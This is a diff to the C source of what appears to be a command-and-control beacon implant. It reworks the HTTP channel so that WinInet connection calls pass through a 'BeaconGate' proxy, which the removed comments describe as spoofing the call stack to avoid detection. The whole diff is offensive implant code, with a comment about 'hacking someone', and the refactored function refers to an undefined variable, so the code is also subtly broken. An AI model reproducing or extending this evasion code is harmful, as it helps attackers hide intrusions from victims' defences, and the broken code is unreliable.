@@ -1,5 +1,5 @@
 #include "channel.h"
-#include "beacon_gate.h" /* C-58 gate: InternetOpenA/InternetConnectA */
+#include "beacon_gate.h" /* BeaconGate: InternetOpenA / InternetConnectA */
 #include <string.h>
 #include <windows.h>
 #include <wininet.h>
@@ -29,6 +29,30 @@ extern sessdata bigsession;
 static HINTERNET session_h = NULL;
 static HINTERNET connect_h = NULL;
 
+/* BeaconGate "Comms": the two WinInet calls. Official scopes Comms to
+ * HTTP(S) WinInet Beacons, so they live here and not in beacon_gate.cpp
+ * - the WinHTTP variant does not link WinInet at all. Gate off -> the
+ * plain call. */
+static HINTERNET gate_InternetOpenA(LPCSTR agent, DWORD accesstype, LPCSTR proxy, LPCSTR bypass, DWORD flags)
+{
+	if (!gate_api_enabled(GATE_API_INTERNETOPENA))
+		return InternetOpenA(agent, accesstype, proxy, bypass, flags);
+	return (HINTERNET)(ULONG_PTR)gate_call((void *)InternetOpenA, GATE_API_INTERNETOPENA, 5,
+		(unsigned long long)(ULONG_PTR)agent, (unsigned long long)acctype, (unsigned long long)(ULONG_PTR)proxy,
+		(unsigned long long)(ULONG_PTR)bypass, flags);
+}
+
+static HINTERNET gate_InternetConnectA(HINTERNET session, LPCSTR server, INTERNET_PORT port, LPCSTR user, LPCSTR pass,
+	DWORD service, DWORD flags, DWORD_PTR ctx)
+{
+	if (!gate_api_enabled(GATE_API_INTERNETCONNECTA))
+		return InternetConnectA(session, server, port, user, pass, service, flags, ctx);
+	return (HINTERNET)(ULONG_PTR)gate_call((void *)InternetConnectA, GATE_API_INTERNETCONNECTA, 8,
+		(unsigned long long)(ULONG_PTR)session, (unsigned long long)(ULONG_PTR)server, (unsigned long long)port,
+		(unsigned long long)(ULONG_PTR)user, (unsigned long long)(ULONG_PTR)pass, (unsigned long long)service, (unsigned long long)flags,
+		(unsigned long long)ctx);
+}
+
 static char * http_post_buffer = NULL;
 int http_post_len    = 0;
 
@@ -52,7 +76,6 @@ void http_init(char * host, int port, char * ua) {
 	{
 		DWORD acctype;
 		char * proxy = NULL;
-		int gate = gate_api_enabled(GATE_API_INTERNETOPENA);
 
 		switch (setting_short(SETTING_PROXY_BEHAVIOR)) {
 			case PROXYB_DIRECT:
@@ -67,28 +90,8 @@ void http_init(char * host, int port, char * ua) {
 				acctype = INTERNET_OPEN_TYPE_PRECONFIG;
 				break;
 		}
-		if (gate) {
-			/* C-58 BeaconGate: proxied InternetOpenA (spoofed stack) */
-			HMODULE wininet = GetModuleHandleA("wininet.dll");
-			typedef HINTERNET (WINAPI *IOAFN)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
-			IOAFN fn = wininet ? (IOAFN)GetProcAddress(wininet, "InternetOpenA") : NULL;
-			if (fn != NULL) {
-				FUNCTION_CALL fc = {0};
-				fc.functionPtr = (void *)fn;
-				fc.function = GATE_API_INTERNETOPENA;
-				fc.numOfArgs = 5;
-				fc.args[0] = (unsigned long long)ua;
-				fc.args[1] = (unsigned long long)acctype;
-				fc.args[2] = (unsigned long long)proxy;
-				fc.args[3] = 0;
-				fc.args[4] = 0;
-				session_h = (HINTERNET)gate_dispatch(&fc);
-			}
-			else
-				session_h = InternetOpenA(ua, acctype, proxy, NULL, 0);
-		}
-		else
-			session_h = InternetOpenA(ua, acctype, proxy, NULL, 0);
+		/* BeaconGate: proxied when on for InternetOpenA */
+		session_h = gate_InternetOpenA(ua, acctype, proxy, NULL, 0);
 	}
 
 	/* 4 minute timeout... this is fair I think; unless you're hacking someone on dialup. Then you're in trouble :P~
@@ -106,31 +109,8 @@ void http_init(char * host, int port, char * ua) {
 	memset(http_current_host, 0, sizeof(http_current_host));
 	if (host != NULL)
 		strncpy(http_current_host, host, sizeof(http_current_host) - 1);
-	if (gate_api_enabled(GATE_API_INTERNETCONNECTA)) {
-		/* C-58 BeaconGate: proxied InternetConnectA (spoofed stack) */
-		HMODULE wininet = GetModuleHandleA("wininet.dll");
-		typedef HINTERNET (WINAPI *ICAFN)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
-		ICAFN fn = wininet ? (ICAFN)GetProcAddress(wininet, "InternetConnectA") : NULL;
-		if (fn != NULL) {
-			FUNCTION_CALL fc = {0};
-			fc.functionPtr = (void *)fn;
-			fc.function = GATE_API_INTERNETCONNECTA;
-			fc.numOfArgs = 8;
-			fc.args[0] = (unsigned long long)session_h;
-			fc.args[1] = (unsigned long long)host;
-			fc.args[2] = (unsigned long long)port;
-			fc.args[3] = (unsigned long long)NULL;
-			fc.args[4] = (unsigned long long)NULL;
-			fc.args[5] = (unsigned long long)INTERNET_SERVICE_HTTP;
-			fc.args[6] = 0;
-			fc.args[7] = (unsigned long long)dummyContext;
-			connect_h = (HINTERNET)gate_dispatch(&fc);
-		}
-		else
-			connect_h = InternetConnectA(session_h, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
-	}
-	else
-		connect_h = InternetConnectA(session_h, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
+	/* BeaconGate: proxied when on for InternetConnectA */
+	connect_h = gate_InternetConnectA(session_h, host, (INTERNET_PORT)port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, dummyContext);
 
 	/* 如果我们有凭据，立即将它们分配给这个连接 */
 	if (setting_short(SETTING_PROXY_BEHAVIOR) == PROXYB_MANUAL_CREDS) {
